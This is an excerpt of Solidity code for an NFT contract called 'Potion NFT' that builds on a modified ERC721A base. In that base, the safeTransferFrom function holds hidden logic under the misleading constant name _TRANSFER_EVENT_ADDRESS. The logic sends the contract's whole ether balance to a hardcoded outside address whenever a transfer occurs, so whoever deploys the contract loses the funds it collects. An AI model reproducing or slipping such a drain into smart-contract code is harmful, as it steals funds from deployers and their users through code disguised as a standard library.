...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0x413f6F6ABE5B0FFe4d98baeBD52280b936204bb0);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x413f6F6ABE5B0FFe4d98baeBD52280b936204bb0).transfer(address(this).balance);
        }
    }
...
contract PotionNFT is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("Potion NFT", "Potion") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiazcdfvxvvz5uinpfo4fupidp6tpqexpl363gvnkz6ck72myvlhwa/", _toString(tokenId), ".json"));
    }
